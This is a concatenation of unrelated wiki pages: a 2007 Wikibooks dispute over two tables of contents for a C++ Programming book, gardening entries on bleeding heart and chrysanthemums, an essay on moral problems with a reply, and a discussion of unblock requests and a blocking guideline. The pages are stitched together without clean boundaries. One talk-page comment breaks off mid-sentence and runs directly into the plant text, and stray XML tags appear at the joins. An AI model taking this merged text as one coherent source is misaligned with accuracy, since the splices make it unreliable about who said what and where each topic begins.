As for the wording and the levels I personally don't need them nor do I make use of it, but for a TOC as I said above the need is to have all the pages at your finger tips, at the moment that is the only way, it can be indeed simplified the chapters aren't pages in themselves they aggregation of sections under a subject, the summaries lists all pages in use on the book (that is the function of the TOC) I am incapable or reducing the display of that information without reducing the usefulness or need of the TOC, the book is big and will even grow bigger (when the exercise book is added there will be exercises for each section).  --[[User:Panic2k4|Panic]] 23:09, 8 April 2007 (UTC)

: I disagree that it fixes the concerns Xixtas and James have. In fact with Xixtas' concerns it makes the problem worse, because you've introduced even more sublevels with the module moves. You also seem to have misunderstood something I said awhile back again, with your introduction of all the Chapter_&lt;title&gt; pages. Those aren't chapters at all, but units (using textbook terminology), because a chapter covers only one topic such as Variables, rather then Variables, Functions, etc. Units covers the latter, helping to group related topics. Also including &quot;Chapter&quot; in the module name goes against naming conventions. I also support using TOC2 as the one and only table of contents (if such a decision is needed), and including a cover page.
: I also think the 32k limit on size of modules need to be dropped too. This is a very limiting restriction, instead what should probably be the case is a module can be broken up into separate modules, when it becomes possible to divide a module into two or more unique topics. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 12:31, 9 April 2007 (UTC)

::To what do you disagree? That it addressed in some ways Xixtas and James comments about TOC1 ?
::Chapters are simply one of the ways to create divisions on a relatively lengthy piece of writing, such as a book, they are usually numbered or titled, chapters can have sub chapter for instance and yes in the lower levels the subject should be as restricted as possible, as for the structure. I think I know a thing or two about what I'm doing, part of the my formation also included Documentation Technologies were we were not only instructed on national and international norms but also how to write  papers and in special technical paper and reports (by this I don't intent to imply that your views are less worthy of attention or consideration), I have agreed with Xixtas and James as they are right, the page has to much text but the book has too much content also and the TOC is intended for people to use and facilitate navigation that same content, TOC2 bare display is quicker and less confusing by it is also less informative on what is inside the each section, I have agreed that if they strongly feel that is best to remove that information I will do it, so to what are you objecting? That even removing that information would not suffice ?
::I have done a review on other books and there is a great variety there are even more confusing setups, but few are as bare as TOC2, I have looked in particular to the books we most relate to C Programming and Java Programming and agree that in TOC1 we are a bit above those levels of complexity but also our book is now way beyond the C Programming and has just passed the Java Programming not only in the level of content but on topics, considering the still to do merge of the exercises book and adding an exercise section to each chapter, that will be even more text...  --[[User:Panic2k4|Panic]] 16:32, 9 April 2007 (UTC)

::: Yes, I disagree that it addressed Xixtas and James comments about TOC1. I think it goes in the wrong direction and introduces more of the problems that were commented on. There a lot of problems with TOC1 that I think TOC2 addresses and clearly people just prefer TOC2. I had previously tried to address the concern on finding out what each chapter is about as part of the general reorganization of several small modules which dealt with general programming concepts into one chapter by suggesting that this chapter also include a general introductory to what each chapter covers. I think the structure of this book is only complex because of how you do things and you butt heads with anyone who tries to reduce the complexity of the book. Its one thing to be instructed on how things should be done and another thing to be able to make it actually work. Your qualifications or lack of qualifications means nothing on Wikibooks, your only judged on your work and actions here. You could be a Nobel Piece Prize winner for all we know, but that doesn't make TOC1 any better if people don't like it. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 18:01, 11 April 2007 (UTC)

::::Darklama you know perfectly well that you were the first to ask for a new structure (and your objections were not only on the verbosity of the TOC but on the order or the chapter and in your need to remove, move and delete content, to what I wouldn't have any problem if you just added as much as you removed, this is the second problem we have amount our selves, second only to your objection to the authors page and the need to add the GFDL to TOC2  print version (at least that one is resolved) and the authors page seems to finally being addressed...)
::::More I have been particularly cooperative, you got your TOC2, with my support, but I notice that you haven't cared for it, even the print version is not equal to what the TOC contains, new pages were introduced and you have failed to add them to TOC2, in any case I will block any deletion plans for TOC1 (unless you can convince me of a real benefit, I haven't seen any but the real bare and simple aspect of it, to what I have stated my objections, we need to take into consideration the readers and that persons using the TOC may not know nothing about the subject or being just wanting to look at a particular section).  --[[User:Panic2k4|Panic]] 18:29, 11 April 2007 (UTC)
::::To me the structure isn't that important, content his, I don't understand the need you have on discussing what model we should use for a door and what color to pain it and the door nob, if the house is still to be constructed, take a look at Editor's TOC and do some work if you want, geez...  --[[User:Panic2k4|Panic]] 18:35, 11 April 2007 (UTC)

::::: I'm hardly the first person to suggest it or say it needs to be done, I could possible be the first to try to do it though since the &quot;forced merger&quot; of two books. There was never a need to address the GFDL on the print out for TOC2, because it was always there, so I ignored that part of your false copyright violation complaint. You've only moved pages around and added pages which make no sense, so I have seen no need to add them. There are still yet other pages like the Windows API ones which of course haven't been added, because I think they shouldn't even be part of this book and any attempts in the past to address that have been subverted by you through reverting. TOC2 wouldn't of even been necessary if you have been more cooperative rather then simply reverting changes made to TOC1 to begin with. People's preference for TOC2, I would hope would open your eyes to the fact that your preferences are not necessary what makes a good book. I am a bit surprised admittedly that your even trying to understand people's objections to it. Saying you'll block any attempts to delete it though is a step back however.
::::: In traditional textbooks, table of contents rarely mention what the chapters discussion, only what the names of the chapters are and the page number that the chapter begins on. I think that is one of the things Xixtas means by professional textbooks. Readers who know nothing about the subject aren't going to understand a summary of the chapter's topic either, by the time they've finished reading the chapter though, hopefully they will understand that aspect of the books subject. A person who knows nothing about the subject isn't going to know what section they want to read first and is very likely to assume its the first chapter listed. OTOH a person who knows something about the subject should be able to figure it out from the chapter names. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 19:12, 11 April 2007 (UTC)

I will not rehash discussions we already know not to see eye to eye, take a look on the talk page of the print version of TOC2 and see perfectly well you objecting to the GFDL being included and the authors page.
As for the first person to suggest a need to the TOC it was indeed you (or you can say it was me and that lead to the fork), for me you could also fork the book (there isn't really a policy or guideline closed on that subject), I don't think it would be helpful but if you think my objections is the only think preventing you of being productive (so far you have not added much content) then I would support you forking the book.
Darklama consensus includes the option to not agree with, this in not about numbers I can even be the only one opposing your changes but if you fail to convince me of the merits I have the option to block (and I think it's obvious that I'm not blocking all your changes nor doing it in bad faith, some of your changes not only demonstrates a bit of disrespect but also consideration, your actions about the author pages and my request to include the GFDL was just an example.&lt;br&gt;
This is not a traditional textbook if it were I would also have objected to have 2 TOCs and we wouldn't be discussion this, right ?  --[[User:Panic2k4|Panic]] 19:22, 11 April 2007 (UTC)
:::::My input has been [http://en.wikibooks.org/w/index.php?title=User_talk%3AWhiteknight&amp;diff=826684&amp;oldid=825987 requested] so i've taken a look at the pages in question. First and foremost we can all agree that the page [[C++ Programming]] should not redirect to [[C++ Programming/Editor's TOC]]. I agree with the criticisms i've read above:
:::::#[[C++ Programming/TOC1]] is confusing and cluttered. However, TOC1 contains all pages and has a complete print version.
:::::#[[C++ Programming/TOC2]] is cleaner and more elegant, but there appear to be some chapters that do not appear on TOC2.
:::::If TOC2 has the superior design (as it seems most people agree) then it should be made into the official TOC and TOC1 should be deleted. However, no TOC should be made the &quot;official&quot; one until it can pass two requirements: (1) it must be clean and easy to read, and (2) it must be complete. To that effect, there are two options available, from which I would advocate for the second:
:::::#Clean up TOC1 to use a better style, and to be less cluttered.
:::::#Expand TOC2 to contain all chapters, and ensure that the print version  for this TOC is complete. 
:::::Putting this issue to a straw poll now would likely show 4 or 5 votes to 1, which is hardly consensus but at the same time is an indication that the minority should consider some form of compromise. Failure to reach consensus on the matter results in maintaining [http://en.wikibooks.org/w/index.php?title=C%2B%2B_Programming&amp;diff=810284&amp;oldid=810242 the status quo], which is ugly and not helpful. For the benefit of the entire book you people need to find a compromise, and failure to find a suitable compromise is unacceptable. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:23, 11 April 2007 (UTC)

I object to a decission by straw pool (also you numbers don't seem correct, see talk page of TOC2 and I think I saw some user commenting in James talk page also), as for  confusing and cluttered we can make the same claim of many other book TOCs this is your personal interpretation and it seem that even the main page of Wikibooks seems to have problems on this regard, but I agree if TOC2 fails to be updated it should be deprecated that was the reason I and Darklama used to remove a previous existing navigation scheme used on the book...  --[[User:Panic2k4|Panic]] 19:31, 11 April 2007 (UTC)

:I didnt say to make the decision by straw poll. Straw polls cannot be used to make decisions, only to measure consensus. My point was only that there appears to be a majority in favor of TOC2, and that you seem to be the only person here defending TOC1. You mention deprecating TOC2 if it is not expanded, but by the same token TOC1 needs to be deprecated if it is not cleaned and improved. Furthermore, as the minority, it is unlikely that the decision will be made in your favor, and if you dont compromise you will be personally responsible for the decreased usefulness of the entire book. Beyond that, if you choose not to compromise (as is typically your method) you will be ignored as being stubborn and &quot;eccentric&quot; and the rest of the book community will move on without you. You have an opportunity to work towards compromise, i suggest you not waste that opportunity. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:47, 11 April 2007 (UTC)

::I don't agree in general in using straw polls even to get an idea on the consensus &quot;status&quot;, since by default they are polarizing, but that is another discussion for another forum...
::As for you interpretation of me against the majority it clearly illustrates the point numbers shouldn't mater or be taken in consideration (for reasons already addressed on other discussions), and I disagree with your interpretation in general about the number and the status of the page just take into consideration [[Nanotechnology]] (Book of the Month December 2006), so it is clear that simpler isn't probably the way to go, Hum I think C++ also got an award or nominated for one some time ago, so not all is that bad, there are more important things to do in the book and if a TOC isn't maintained it should be discussed for deletion and not on the general VfD but by the book community, as we have done with the stagnant navigation scheme I referred above (deleted by consensual decission).  --[[User:Panic2k4|Panic]] 19:57, 11 April 2007 (UTC)

:::You can say whatever you want to say, but not compromising is not acceptable here. Any solution, even one that you personally disagree with is better then the current status.

::::Whiteknight what is wrong is you validation of actions against consensual discussion or lets call them BeBold actions without regard to expressed opposition. The current status exist because Darklama removed unilaterally the TOC1 from the front page (even after I have expressed objections to it) so please don't imply that I'm unwilling to compromise as I have done it enough times and even the existence of a second TOC is prof that I'm able to...
::::Consider the fallowing would it be OK for me to go to the book you are working on and change the cover page, without consultation with the other contributors of the book, and even do it if they expressed objections ?   --[[User:Panic2k4|Panic]] 20:21, 11 April 2007 (UTC)

:::::It is acceptable for you to change the cover page in a book I am working on without asking for my permission. You can alter any page in any book at any time. This is a wiki, and no author has unilateral control over any book or page, and no author needs to be asked for permission to make any change. If darklama didn't ask your permission, it's because ''he didn't need to''. '''Nobody needs to ask you for anything ever.''' 
:::::The current status exists because you don't control this book, and because people are allowed to do things that you disagree with. I wanted you to be blocked from wikibooks forever, but you were unblocked: people didnt need to ask my permission to unblock you, and they didn't need to stop for every objection. Your continued participation on this project is proof that you don't understand the process of making decisions here. Who cares if you objected or not? does it really matter? should we all stop and ask for your permission when we make a change, and should the entire community stop making forward progress for your every disagreement? It would be nice if you would agree, but your agreement is not strictly needed if the community wants something else. You have two options really, unless half a dozen wikibookians magically join the discussion and agree with you:
:::::#Radically fix TOC1 to be cleaner and easier to read, and then try again to convince people that TOC1 is better then TOC2.
:::::#Accept TOC2, and make the changes that are necessary to make it complete. 
:::::Insistance that you should get what you want despite being the minority is called being &quot;stubborn&quot;, and stubbornness has no place in consensus decision making. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 20:39, 11 April 2007 (UTC)

That statement is not correct, I don't need to ask permission to change any page (but at least I should exert careful consideration when I do perform an action covered by being bold) that is perfectly explained on the BeBold, Darklama wasn't being bold he had previous knowledge that I opposed it, it was indeed a editors conflict that he unilaterally decided to shift to his understanding of what should be there, to his credit he only used editor's toc (my name it was TOC3), the status of the present cover page was created by that action nothing more.&lt;br&gt;
I'm not being stubborn, I'm blocking the change because I think the actual page (you creation) is not perfect but it is indeed better than toc2 or editor's toc, and continue to defend that toc1 is the better option, and until consensus is reached should have been restored. I strongly disagree in the power of numbers.  --[[User:Panic2k4|Panic]] 22:56, 11 April 2007 (UTC)

:My &quot;creation&quot; was a response to an edit war to which you were a party. There would still be a TOC up there if you and your sockpuppets hadn't gotten into a war over it. You are being stubborn because something has to change, and you are resisting any option that is not yours. If you would spend half the energy cleaning TOC1 to make it better that you spend arguing with Darklama and I about all this stupid stuff, the TOC1 would be great and everybody would love it. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 01:28, 12 April 2007 (UTC)

::Whiteknight, TOC1 isn't bad, it can indeed be improved as anything else, I have consideration for you comments as all other users views on what should be there, the toc is not overcomplicated and there are other examples of similar tocs on Wikibooks or even other that are more complex, in this case, I'm not the only &quot;contributor&quot; of that toc, it was the result of the evolution of the book under several editors (you can check the history of both tocs), toc2 on the other hand was a creation of Darklama (I even have contributed to it, but little I stated to Darklama that I thought it was of benefit having another structure available to the users, but that i would not actively maintain it) and was added with my agreement to the book (even altering the order of the pages, I have no problem with that).  I have a problem on how you see that any user that wants to make a change can impose or even lead the book into disorder or degrade it's use by unilaterally and with disregard the be bold setup, that action has lead the book into what is indeed a edit dispute (not a revert war, even if you want to believe that the alteration was done by one of my puppets it didn't revert a change of Darklama), your action and SB Jhonny on this has been partial since you have empowered a user to bypass the normal decission and discussion process, in several steps this is supported by other discussions and divergences we have had and still have in other points.
::I have no problem in working with Darklama or any other user I just reserve the right to disagree with some changes if not convinced that they are an improvement or of benefit to this book or on anything that does have an impact on the community, for instance TOC3 (the editor's toc, I see it as a great idea, and have used it and maintained it) I don't interfere in books I have no part in (even if I may do some edits or have some ideas I'll always abstain to do major reformatting without checking with the people actively working on it, this falls into the definition of respect for others views and in agreement of the BeBold), I'm not asking that toc2 should be deleted or in any way changed but it is my view that taking in consideration precedence and how the change was done, toc1 should be restored to its old position and discussion continue on how to improve it nothing more.  --[[User:Panic2k4|Panic]] 02:04, 12 April 2007 (UTC)

:::Sometimes less is more. Just to pull an example out of the hat in TOC 1 there's &quot;Comparisons&quot; which is described as &quot;No language above all else, simple introduction on the diversity of programming languages and a jump point to more experienced readers.&quot; How is that in any way helpful to the reader? BTW, there are many other examples that would have worked equally well. I do wonder if all that small text was replaced with &quot;&lt;small&gt;Blah blah, rhubarb gobbledygook.

'''''Dicentra''''' is a genus of about 20 species of herbaceous flowering plants in the family Fumariaceae, native to Asia and North America. The common name '''Bleeding heart''' is used for many of the species. This name comes from the appearance of the pink flower, which resembles the shape of a heart with a drop of blood descending.

All members of the genus are toxic if eaten by humans, housepets, or livestock.

==Description==
Foliage is basal and alternate, pinnately dissected or compound, lacking stipules, and without hairs. Stems contain a thick, clear juice. Roots are rhizomes, tubers, taproots, or fibrous. Fruit an elongated capsule.

Many species are late ephemerals, dying down in mid to late summer.

==Growing conditions==
Deep, rich soils in light shade to shade.

==Varieties==
* ''[[../Dicentra canadensis/]]''  - Squirrel-corn

'''''Dicentra spectabilis''''' also known as '''Venus's car''', '''bleeding heart''', or '''lyre flower''', is a perennial herbaceous plant native to eastern Asia from Siberia south to Japan. 

==Description==
This species of bleeding heart can grow to 60-140 cm tall and has pinnately compound leaves with ternately compound leaflets (leaflets that come in threes). The flowers are pendulous, shaped much like hearts, produced in a raceme bearing 3-15 individual flowers, each one 2-3 cm long, with pink outer petals and white inner petals. The flowering season is from early spring to mid summer. 

==Growing conditions==
It can be a full sun plant if in a cool area but in a warm climate, prefers semi-shaded areas. It needs to be kept moist and prefers neutral to alkaline soil with good drainage although these plants can tolerate heavy clay soil as well. 

==Varieties==
[[Image:Bleeding heart.jpg|left|thumb|The cultivar 'Alba' has pure white flowers]]
Several cultivars have been selected, including 'Alba', with pure white flowers, and 'Goldheart', a relatively new cultivar developed at Hadspen Garden in England and introduced in 1997 with fuchsia-coloured flowers that drop from the stem in a row, and yellow foliage that turns lime green by mid summer. 

==Uses==
It is a popular ornamental plant for flower gardens in temperate climates, and is also used as a cut flower. 

==Maintenance==
Cut down foliage after it has gone completely yellow.

==Propagation==
[[Image:Tränendes_Herz_(Dicentra_spectabilis).jpg|thumb|left|blossoms of ''Dicentra spectabilis'']]
Propagation is by sowing the seeds when fresh. It can also be divided, preferably in the late fall or early spring. However, contact with the plant can cause skin irritation because the entire plant is toxic, so should be handled with gloves and long sleeves.

==Pests and diseases==
See ''[[../Dicentra/]]'' for a list of pests and diseases.

'''Chrysanthemums''' are a genus (''Chrysanthemum'') of about 30 species of perennial flowering plants in the family Asteraceae, native to Asia and northeastern Europe. The genus once included many more species, but was split several decades ago into several genera; the naming of the genera has been contentious, but a ruling of the [[w:International Code of Botanical Nomenclature|International Code of Botanical Nomenclature]] in 1999 has resulted in the defining species of the genus being changed to ''Chrysanthemum indicum'', thereby restoring the economically important florist's chrysanthemum to the genus ''Chrysanthemum''. These species were, after the splitting of the genus but before the ICBN ruling, commonly treated under the genus name ''Dendranthema''.

The other species previously treated in the narrow view of the genus ''Chrysanthemum'' are now transferred to the genus ''[[../Glebionis/]]''. The other genera split off from ''Chrysanthemum'' include ''[[../Argyranthemum/]]'', ''[[../Leucanthemopsis/]]'', ''[[../Leucanthemum/]]'', ''[[../Rhodanthemum/]]'', and ''[[../Tanacetum/]]''. Naming in the horticultural trade is quite inconsistent, with ''Chrysanthemum'' and ''Dendranthema'' still in common usage.

==Description==
The species of ''Chrysanthemum'' are herbaceous perennial plants growing to 50-150 cm tall, with palmately 3-7 lobed, thick leaves and large flowerheads, white, yellow or pink in the wild species.

Modern chrysanthemums are much more showy than their wild relatives. The flowers occur in various forms, and can be daisy-like, decorative, pompons or buttons. This genus contains many hybrids and thousands of cultivars developed for horticultural purposes. In addition to the traditional yellow, other colours are available, such as white, purple, and red. The most important hybrid is ''Chrysanthemum × morifolium'' (syn. ''C. × grandiflorum''), derived primarily from ''C. indicum'' but also involving other species.
[[Image:Chrysanthemum Bunch Closeup 3264px.jpg|right|thumb|A closeup of the flowers]]

Chrysanthemum leaves resemble its cousin, the mugwort (''[[../Aremisia vulgaris/]]''), which is sometimes called wild chrysanthemum.

==Growing conditions==
Fertile, well-drained, consistently moist soils in full sun to light shade. 

==Varieties==
Several horticultural types are recognized, including: 
*'''Cushions:''' Plants that grow densely by nature, and need no pinching; '''Semi-cushions''' are often advertised as cushions, but may require some pinching; 
*'''Daisies''' have daisy-like heads
*'''Doubles''' have all or mostly ray florets
*'''Buttons''' are small doubles
*'''Pompons''' are miniature and ball-shaped.  

==Uses==
Chrysanthemums make a welcome addition to the garden, in particular because their late flowering offers advantages when the other garden plants are winding down for winter. Outdoor flowering chrysanthemums will need protection from hard frosts.

Chrysanthemums were cultivated in China as a flowering herb as far back as the 15th century BCE. An ancient Chinese city was named Ju-Xian, meaning &quot;chrysanthemum city&quot;. The flower was introduced into Japan probably in the 8th century CE, and the Emperor adopted the flower as his official seal. There is a &quot;Festival of Happiness&quot; in Japan that celebrates the flower.

The flower was brought to Europe in the 17th century. Linnaeus named it from the Greek prefix chrys-, which means golden (the colour of the original flowers), and -anthemon, meaning flower.

Yellow or white chrysanthemum flowers are boiled to make a sweet drink in some parts of Asia. The resulting beverage is known simply as &quot;chrysanthemum tea&quot; (菊花茶, pinyin: jú huā chá, in Chinese). 

Chrysanthemum tea has many medicinal uses, including an aid in recovery from influenza. In Korea, a rice wine flavored with chrysanthemum flowers is called gukhwaju (국화주).photo 1photo 2
The leaves of several species such as Chrysanthemum coronarium, the Garland chrysanthemum, which is grown commercially in East Asia as a leaf vegetable, known as tung ho (Template:Zh-cp), shungiku (Template:Lang-ja[シュンギク]) or ssukkat (Template:Lang-ko). In China, the greens are often stir-fried simply with garlic and dried chili peppers. The colour of the cooked greens is dark, their texture dense and mucilaginous, and their flavour fragrant and complex.

Pyrethrum (''Chrysanthemum'' (or ''Tanacetum'') ''cinerariaefolium'') is economically important as a natural source of insecticide. The flowers are pulverized and the active components called pyrethrins, contained in the seed cases, are extracted and sold in the form of an oleoresin. This is applied as a suspension in water or oil, or as a powder. Pyrethrins attack the nervous systems of all insects, and inhibit female mosquitoes from biting. When not present in amounts fatal to insects, they still appear to have an insect repellent effect. They are harmful to fish, but are far less toxic to mammals and birds than many synthetic insecticides and are non-persistent, being biodegradable and also breaking down easily on exposure to light. They are considered to be amongst the safest insecticides for use around food. (Pyrethroids are synthetic insecticides based on natural pyrethrum, e.g., permethrin.)

==Maintenance==
Fall-blooming species benefit from being cut back about 1/2 way down in midsummer in order to encourage a bushy habit.

==Propagation==
Division or cuttings.

Moral problems can emerge from any environment—home, family, business, social, medical, and so on, and may look like a pysical or mathematical problem but moral problems have a reality of their own.

Human beings can experience reality beyond physical phenomenon. Much of human experience is not an issue of mathematical perfection. Much of human experience eludes scientific analysis. Much of human experienced is not physical or mathematical.

Justice and fairness, for example, escape scientific analysis and yet most humans have a sense of fairness and justice. Dissimilar cultures (western vis-à-vis eastern) still have “morals” and “ethics” related to humans killing each other, marriage, reproduction, trade, transportation, barter, theft, agreements, language and symbols, and all forms of interpersonal relationships.

Humans have the ability to create a reality psychologically. It is called metaphor. Metaphor is not studied by science and yet it is a powerful human function. In its simplest form metaphor can predicate the existence of a force or posit a form of being (such as accountant or King) upon another human. Hence, in the Magna Carta is the statement “I, John, by grace of God, King, …” But since John is just another human, this kingness is a purely metaphoric process .. a human creation. Nevertheless, the process makes John king and he has almost infinite power over other humans within his realm. He has the power of life and of economics, marriage, reproduction, trade, transportation, barter, theft, agreements, symbols, and all forms of interperaonal relationships all by operation of a collective human will or metaphor.

Human leaders can be irrational. Leaders such as Adolph Hitler, Joseph Stalin, various kings and czars have been observed by millions to be irrational and to have imposed a quality of irrational being upon millions of other humans (creating irrational societies). Such irrationality defies science or mathematics. It could be called an exception but irrationality is concrete reality for entire cultures (nations and even beyond national limits).

Irrational and illogical human behavior exists and is real, has effect and is caused and yet it defies mathematical or scientific analysis. Pseudo-science such as psychology and sociology attempts to explain irrational and illogical human behavior using “scientific method” but scientific method fails to reduce observed human phenomenon to mathematical or scientific models.

Human behavior is concrete, exists, can be observed and be relatively widespread and yet it can defy scientific explanation. Animals are not rational and seem not to have the same sense of fairness and justics as humans but do not engage in irrational behaivor, and have behaviors more readily explained in terms of survival.

If the difference between human behavior and animal behavior is rationality, then it may be the very rational nature of human beings that brings on irrational (and immoral) behavior. The very same qualities that enable humans to study math and physical phenomenon can enable humans to be irrational, unjust, immoral and to defie scientific and mathematical unexplaination.

Scientists and mathematicians can be irrational as often and to the extremes of any human. Thus rationality and intellect have no affect in making human behavior rational. There are many popular books and plays about “mad scientists,” e.g., “Frankenstein.” An insane Unabomber was a mathematician and scientist and claimed a moral justification for his irrational and immoral acts. Some of the most intelligent humans (including scientists and mathematicians) are also irrational and immoral.

Human behavior has altered the physcial earth to the extent that threatens life forms of earth. Human behavior is therefore an observable concrete phenomenon and yet it paradoxically defies mathematical and scientific analysis. Human intelligence, using science and mathematics, has contructed infrastructure that depends upon converting fossil fuels into energy. The same process produces excess “greenhouse” gases that threaten to alter global temperatures and modify the life supporting nature of planet earth.

Moral problems can thus emerge from any human environment: home, family, business, social, medical, mathematical and scientific. Moral problems, like any problem, are circumstances that need to be resolved. Resolving a moral problem does not necessarily resolve underlying problems or problems that were created as a consequence of a moral problem.

Moral problems ask the mind to decide which solutions are “right” and which are “wrong.” But it also asks humans to make choices about their behavior which are morally right. The rightness and wrongness of a solution is not based upon mathematical and scientific analysis but upon human metaphor, a sense of justice and ethics and cultural values.

Which behaviors might be deemed to be “good” rather than “bad” cannot be resolved with mathematics or scienfic method. For example, if global warming were calculated to make earth incapable of supporting life within 400 to 500 years and it were entirely the consequence of human infrastructure, then a purely rational solutions (supported by inductive reasoning and mathematical deduction) would force human beings to stop activities which increase global warming and do activities which reduce it.

Clearly that solution would be impossible. Too many cultures (eastern, western, northern, southern) would refuse to alter their behavior and allow the process to contnue even if it were proved to be life terminating. This has already been observed and documented in such areas as harvesting trees, fishing, reckless use of nuclear energy, and increased conversion of fossil fuels.

Moral problems do not remain within the mind, therefore, but become their own reality beyond the physical and mathematical world. But science and mathematics have almost no ability to address moral problems.

Moral problems are the subject of human institutions such as cultures, religions and legal systems. And yet those systems are themselves corrupted by immoral human influences. Justice can thus be purchased in most human institutions and irrational tyranny can result.


Even when there are flags that states, “Beware—Moral Problem!” difficulties may arise, and solutions may evlude us.

In almost every human decions there is a moral decision, and moral decision can be difficult.

Moral problems are not similar to mathematical or scientific problems. Moral problems ask the mind to choose (not merely to decide) which solutions are “right” rather than “wrong,” and which behaviours might be deemed to be “good” rather than “bad.” Human beings choose wrong behaviors as often (or more often) than right behaviors in spite of awareness of the moral wrongness. Murder, assault, theft, fraud, deception, recklessness are a choise regardless of the known immorality of the choice.

When a human entity (person, family, community, nation) chooses immoral behaviors it knowingly elects the consequences that follow. They may therefore be held accountable for moral choices. Human institutions thus have the power to determine the morality of choices and to impose punishments upon humans who choose immoral behavior.

Human institutions include &quot;justice&quot; systems that examine behaviors and impose objectively applied punishments. Human institutions include social and religious punishments for lesser transgressions.




The revision, dated 14:29, December 26, 2006, misses the points being made in the original discussion. 
Moral problems are identical to practical problems in that: 
1. Both arise from an “environment.” 
2. This “environment” contains solutions to the problem being investigated. 
3. And, seeking an appropriate “goal” or “purpose” in that “environment” may solve the problem. 
Rational thinkers solve both practical and moral problems by: 
4. Learning the “environment’s” properties. 
5. Using this knowledge to select the most suitable solution. 
6. And, applying this knowledge to reach the chosen goal or purpose. 
To solve practical problems, one must understand and apply the practical properties of the “real” environment. 
To solve moral problems, one must understand and apply the “moral” environment. However, moral environments are inventions, and the “moral” environment being considered is different from one individual to another. (Each individual invents their “moral” environment from his/her past experiences, education, physiology, etc.) Religions try to solve “moral” problems by offering a set of moral codes that “fit” the moral “environment” they favour. 
If we do not try to understand how “moral” problems are formed, then we will never be able to form a “unified” moral code, and, I fear, never be able to build a civilised world.

P.S. I think that the proposed amendment should be moved to the discussion page, rather than replace the original text. May I do that? David Hockey 16:21, 27 December 2006 (UTC)</text>

      <text xml:space="preserve">== Unblock reviews ==
Nothing to do with Panic!

An unblock request from an IP came thro a couple of days ago (&amp; the same IP made the same request a day earlier on Commons).  Because of RC watching I thought I would deal with it and did so.  Then I realised that it was the first one I had experience and I wondered what the procedure was!!  I think this one is straightforward (and may well be one to be unblocked and then reblocked for consistency - the blocks on WP &amp; Commons are indef whereas here it is a year and IMO should be indef) and the request was declined in a similar way on Commons.

However - are there any guidelines or should there be.  Reading the draft I see that it should be the blocking admin who reviews - nothing against that but that could wait around a fair while until the blocking admin was 1. around &amp; 2. noticed the request.

Equally the page remains in that category, should it? --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 00:31, 20 February 2007 (UTC)

:What is the user page of this request? Since there isn't a standing policy to deal with this, you can use your best judgement in this. This is a new policy proposal, and there are still alot of kinks to work out. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 00:41, 20 February 2007 (UTC)

::[[User talk:72.177.68.38]] --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 00:44, 20 February 2007 (UTC)

::: Your action is fine by me. If they were to have unblocked this IP on commons, that might be a different story. It does pay to be vigilent of actions on other wikis. By the text of this proposal, you likely would have had to start a discussion on the matter, probably [[WB:AN]]. Say something like &quot;This user was blocked a while ago, has requested unblocking, this is the evidence for or against, etc&quot;. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 00:48, 20 February 2007 (UTC)

:::: I guess I see this as a kind of obvious one and I am sure I would have consulted had I felt it was controversial (as a point of interest there was no consultation on Commons tho a 'crat dealt with it - after I had pointed the request out &lt;g&gt;).
:::: Similarly I would not overturn Derbeth's block without real thought although I think it may be appropriate in this case - I take it you looked at the WP page - not seen one like that before - quite a history there --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 00:53, 20 February 2007 (UTC)

== Could we make this a guideline? ==
I have noted before that I do not like a prescriptive list of when to block and when not to block, so that any admin making a block on very good reasons, but not in accordance with the prescribed list, risks being damned as rogue. I can, however, see benefits of a general guideline, that covers points that are commonly dealt with, that does not purport to be exhaustive, and that makes clear that there is a commonsense override, particularly in situations not contemplated when that guideline is written.

Could we therefore move this proposal to [[Wikibooks:Blocking guideline]]? [[User:Jguk|Jguk]] 21:49, 25 February 2007 (UTC)

